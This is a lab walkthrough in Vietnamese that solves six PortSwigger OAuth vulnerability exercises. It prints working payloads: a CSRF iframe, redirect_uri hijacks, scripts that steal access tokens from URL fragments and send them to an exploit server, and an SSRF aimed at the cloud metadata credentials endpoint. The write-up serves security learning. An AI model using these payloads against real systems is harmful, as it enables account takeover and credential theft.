# Nguyễn Văn Thọ - OAuth authentication

###### tags: `portswigger lab`


## Bài 1: Authentication bypass via OAuth implicit flow

>![](https://i.imgur.com/ljCJBgY.png)

Bài lab sử dụng `implicit` grant type để lấy token và dùng token đó (cùng với `userinfo`) để đăng nhập cho user.

Kiểm tra ta thấy có 1 request POST để authenticate, thông tin tham số gửi đi như sau:

>![](https://i.imgur.com/a6b3ZhA.png)

Thử thay đổi email thành của user khác, ta thấy vẫn đăng nhập thành công. Vậy là server chỉ xác thực dựa trên userinfo (ở đây là email) mà ko check xem access token có match vs email đó không

>![](https://i.imgur.com/hzyrIEY.png)

<hr>

## Bài 2: Forced OAuth profile linking

>![](https://i.imgur.com/DKu0mzh.png)

Mục tiêu của bài lab là link social account của ta với tài khoản admin -> khi ta đăng nhập bằng social account, ta có thể được coi như admin.

Sau khi đăng nhập ta có chức năng `attach social media profile` dùng để link 1 social profile vào trang hiện tại.

>![](https://i.imgur.com/ODLsppQ.png)

Sau khi xác thực, bằng tài khoản mạng xã hội, ta thấy nó sẽ thực hiện redirect tới trang `oauth-linking` để liên kết tài khoản mạng xã hội vào profile người dùng KÈM THEO AUTHORIZTION CODE

>![](https://i.imgur.com/ilxX8kX.png)

Tuy nhiên lại không có tham số `state` ở đây để ngăn chặn CSRF attack, nghĩa là không có cách nào cho server xác định request `oauth-linking` đến từ đâu ngoại trừ thông qua cookie, ta có thể tạo CSRF attack từ đây.

Đầu tiên sử dụng chức năng link social profile để tạo được 1 mã authorization code.

Tiếp đó drop request `/oauth-linking` để author code này vẫn chưa được sử dụng.

Tạo 1 iframe lấy source là request tới đường dẫn này (kèm theo tham số token là mã mà ta vừa dụ oauth server generate ra). Khi admin load iframe, sẽ gửi 1 request tới đường dẫn link profile của ta vào tài khoản admin.


```htmlembedded!
<iframe src="https://0a7000a9034c1318802aa3ba00c00016.web-security-academy.net/oauth-linking?code=4rlPd49R3v1FpxBXte49KZWtXeogoNFPvw-osfOI2ij">
</iframe>
```

Cuối cùng đăng nhập bằng tài khoản mạng xã hội, ta vào được `admin channel`

*Nếu có state token, server sẽ biết được request xác thực và request linking profile là của 2 người dùng khác nhau, nhờ đó phòng chống được cuộc tấn công*

>![](https://i.imgur.com/2mMtGdQ.png)

<hr>

## Bài 3: OAuth account hijacking via redirect_uri

>![](https://i.imgur.com/Pz9gBdX.png)

-> mục tiêu là lấy Authorization code của account khác rồi truy cập dưới quyền của nạn nhân. (ở đây là admin)

Thử thay thế trường `redirect_uri` của author request thành địa chỉ của burp client, ta thấy nó có gửi redirect tới kèm theo token (Oauth server không xác thực rằng callback uri thuộc một domain không liên quan).

>![](https://i.imgur.com/UBhiFCZ.png)

Vậy ta chỉ cần dụ admin khởi tạo một author request, và đánh cắp token của admin, sau đó có thể dùng nó để xác thực ở request `/oauth-callback?code=xxxxx`

Vì quá trình khởi tạo auth request không đính kèm `state` nên ta có thể dễ dàng giả 1 request như vậy

```htmlembedded!
<img src="https://oauth-0af3006a033d675b8082103a02c7003d.oauth-server.net/auth?client_id=r0hv7ku5szci46vjw5nph&redirect_uri=https://my-url&response_type=code&scope=openid%20profile%20email">
```

Gửi tới admin, khi admin truy cập sẽ tự khởi tạo 1 auth request và token về tới burp client của ta.

Ta tiếp tục quá trình bằng cách lấy token trộm được và đem gửi tới client application. Client application coi các thông tin user-data thu được như là định danh và đó ta được định danh như là admin.



>![](https://i.imgur.com/ySjfAUB.png)

<hr>

## Bài 4: Stealing OAuth access tokens via an open redirect

>![](https://i.imgur.com/qbWuDk5.png)

>Due to the kinds of attacks seen in the previous lab, it is best practice for client applications to provide a whitelist of their genuine callback URIs when registering with the OAuth service. This way, when the OAuth service receives a new request, it can validate the redirect_uri parameter against this whitelist. In this case, supplying an external URI will likely result in an error.

Để solve bài lab này, ta cần tìm đường dẫn redirect để bypass cơ chế kiểm tra `redirect_uri` (trong trường hợp nó chỉ kiểm tra phần domain của đường dẫn)

Kiểm tra trang web ta thấy chức năng `next post` nhận 1 đường dẫn để redirect

>![](https://i.imgur.com/mKzdNEA.png)

Ngay cả đường dẫn tuyệt đối nó cũng chấp nhận redirect

>![](https://i.imgur.com/ZBIlaZD.png)

Tuy nhiên, bây giờ `redirect-uri` cần đúng chuẩn `https://0a9e00cd042b3a0480987186001d00aa.web-security-academy.net/oauth-callback`. Để bypass đoạn này ta có thể dùng directory traversal để điều hướng đến phần `next post`, và từ `next-post` ta có thể điều hướng đến exploit server.

payload:
```!
https://0a7400c804c6b7a2801eb2a600aa004a.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a6a008c04f5b7b08038b1b0019300e7.exploit-server.net/exploit/
```

Vậy bây giờ token đã được gửi đến exploit server, ta cần kiểm tra xem token được gửi dưới dạng gì (tham số gì hay fragment)

>![](https://i.imgur.com/Qe2ih1D.png)

Ta thấy access token được gửi về trên fragment, cần chuẩn bị payload để tách nó ra, như sau

```javascript!
<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-0ae7008904163a3d80866fc7025e009b.oauth-server.net/auth?client_id=fwn84pz4j1iwcihpsvbzw&redirect_uri=https://0a9e00cd042b3a0480987186001d00aa.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a8a00b104233a2980c87022014d00ed.exploit-server.net/exploit/&response_type=token&nonce=60630693&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
```

Kiểm tra access log ta thấy có token gửi tới

>![](https://i.imgur.com/K9aC88U.png)

Dùng token đó để thay thế giá trị trong header `Authorization` ta có kết quả như hình dưới.
>![](https://i.imgur.com/RPg9UzH.png)


>![](https://i.imgur.com/221kvgQ.png)


## Bài 5: SSRF via OpenID dynamic client registration

>![](https://i.imgur.com/UgKxK1P.png)

Dịch vụ OAuth cho phép Client application tự đăng kí thông qua 1 post request tới 1 endpoint của Oauth, nội dung post sẽ có dạng như sau:

```json!
{
    "application_type": "web",
    "redirect_uris": [
        "https://client-app.com/callback",
        "https://client-app.com/callback2"
        ],
    "client_name": "My Application",
    "logo_uri": "https://client-app.com/logo.png",
    "token_endpoint_auth_method": "client_secret_basic",
    "jwks_uri": "https://client-app.com/my_public_keys.jwks",
    "userinfo_encrypted_response_alg": "RSA1_5",
    "userinfo_encrypted_response_enc": "A128CBC-HS256",
    …
}
```

>![](https://i.imgur.com/mdScoHJ.png)


Truy cập đường dẫn `/.well-known/openid-configuration`, ta có thể xem được cấu hình của oauth provider

>![](https://i.imgur.com/uz4u6dh.png)

Trong đó ta có thể chú ý rằng đường dẫn `register endpoint` nằm ở:

>![](https://i.imgur.com/WbeznHr.png)

Thử đăng ký thông qua việc post lên endpoint này, ta thấy thông tin trả về như sau:

>![](https://i.imgur.com/mbEgGUB.png)

Vậy là ta có thể tự mình kích hoạt việc đăng kí với oauth provider.

Kiểm tra trong các request còn lại thu được trên proxy, ta thấy còn có 1 request để lấy logo ở request `/client/<clientId>/logo`, quay lại lúc đăng kí, ta thử đăng ký với logo_uri custom và xem kết quả

```json!
{
"redirect_uris" : [
    "https://3z3iye16lacirbmycd9qun29x03xrm.oastify.com"
],
"logo_uri" : "https://f2iu1q4iomfuunpafpc2xz5l0c6auz.oastify.com"
}
```

Kết quả

>![](https://i.imgur.com/dHKyMaz.png)


Thử truy cập lại GET /client/`clientId`/logo, ta thấy nó gửi request tới đường dẫn này. 

>![](https://i.imgur.com/23KNiSP.png)

Vậy là OAuth có truy cập vào đường dẫn mà ta cung cấp, thử SSRF với `logo_uri=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/` ta có kết quả như sau
    
>![](https://i.imgur.com/owEb33Q.png)

>![](https://i.imgur.com/mE6pQFA.png)

## Bài 6: Stealing OAuth access tokens via a proxy page

>![](https://i.imgur.com/JNSIywI.png)

Kiểm tra ta thấy trang web nhúng 1 frame cho phần comment 
    
>![](https://i.imgur.com/9M6Yxcd.png)

Kiểm tra source của iframe, ta thấy `/post/comment/comment-form` có đoạn script như sau:

>![](https://i.imgur.com/3is9bgP.png)

Nó post 1 message tới nơi mà nó được nhúng với `type: 'onload', data: window.location.href`

Dưới đó là hàm `submitForm` sẽ thực hiện post comment tới trang mà nó đang đc nhúng.

Ở bài lab sử dụng redirection phía trên, ta đã được biết kĩ thuật directory traversal để bypass whitelist và điều hướng `redirect_uri` đến đường dẫn ta mong muốn. Nếu ở bài này, ta dùng kĩ thuật đó để redirect tới `/post/comment/comment-form` thì ta sẽ nhận được `window.location/href` (khi ta nhúng trang này trên exploit server), cụ thể trên exploit server ta setup payload như sau

```htmlembedded!
<iframe src="https://oauth-0a8200c003fc3a2b806e064102a80025.oauth-server.net/auth?client_id=wb9nare3p3f12cbsck3we&redirect_uri=https://0a3e0005034b3a3b80880834006000b8.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=532382906&scope=openid%20profile%20email"> </iframe>

<script>
    window.addEventListener('message', function(e) {
        fetch("/" + encodeURIComponent(e.data.data))
    }, false)
</script>
```


Khi admin truy cập sẽ tự khởi tạo 1 request xác thực OAuth, và khi Author token trả về, nó sẽ trả về trên fragment của đường dẫn `/post/comment/comment-form`. Và vì đường dẫn này thực hiện `postMessage()` đến trang mà nó đang đc nhúng, nên nó sẽ post lên exploit server. Và trên exploit server ta có EventListener để handle post request đó -> ta lấy được access token. Dùng token đó để xác thực ở request `/me` thì ta lấy được các thông tin của Admin như sau.

>![](https://i.imgur.com/NhXhNg1.png)

Kết quả của vector khai thác đã mô tả.

>![](https://i.imgur.com/yndcWn8.png)

